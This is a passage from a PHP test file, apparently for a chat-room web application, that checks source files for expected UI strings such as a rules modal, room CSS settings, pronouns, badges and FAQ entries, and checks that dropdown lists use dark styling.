        foreach (['.user-updated', '.room-updated', 'RulesModal', 'shownMessages', 'StatusDot', '<Flag '] as $piece) {
            $this->assertStringContainsString($piece, $room);
        }

        $this->assertStringContainsString('I agree', $this->source('resources/js/Components/RulesModal.tsx'));
        $this->assertStringContainsString('Do not show again in this room', $this->source('resources/js/Components/RulesModal.tsx'));
        $this->assertStringContainsString("'Room CSS'", $this->source('resources/js/Components/RoomSettingsPanel.tsx'));
        $this->assertStringContainsString("'Rules'", $this->source('resources/js/Components/RoomSettingsPanel.tsx'));
        $this->assertStringContainsString('data-status-option', $this->source('resources/js/Components/Sidebar.tsx'));
        $this->assertStringContainsString('Pronouns', $this->source('resources/js/Pages/Profile/Edit.tsx'));
        $this->assertStringContainsString('Special badges', $this->source('resources/js/Components/admin/UsersTab.tsx'));
        $this->assertStringContainsString("auth.user.status !== 'busy'", $this->source('resources/js/Components/FriendToast.tsx'));

        // and the words that explain them
        $this->assertStringContainsString('Room CSS', $this->source('resources/js/Pages/Docs.tsx'));
        $this->assertStringContainsString('CSS_HOOKS', $this->source('resources/js/Pages/Docs.tsx'));
        $this->assertStringContainsString('What are the special badges?', $this->source('resources/js/Pages/Faq.tsx'));
        $this->assertStringContainsString('How do I show my flag and my pronouns?', $this->source('resources/js/Pages/Faq.tsx'));
        $this->assertStringContainsString("version: '1.30'", $this->source('resources/js/lib/patchNotes.ts'));
        foreach (['Tastycat', 'Tasty', 'Monstercat'] as $scene) {
            $this->assertStringContainsString($scene, $this->source('resources/js/Pages/Faq.tsx'));
        }
    }

    public function test_every_dropdown_list_is_dark_so_its_light_text_can_be_read(): void
    {
        // the open list of a <select> is drawn by the browser and is white unless the page says otherwise (country, favourite genre, the user filters in the admin panel ...)
        $css = $this->source('resources/css/app.css');
        $this->assertMatchesRegularExpression('/select\s*\{\s*color-scheme:\s*dark;\s*\}/', $css);
        $this->assertMatchesRegularExpression('/select option,\s*select optgroup\s*\{\s*background-color:\s*#0a0a0a;\s*color:\s*#f5f5f5;\s*\}/', $css);
    }
}
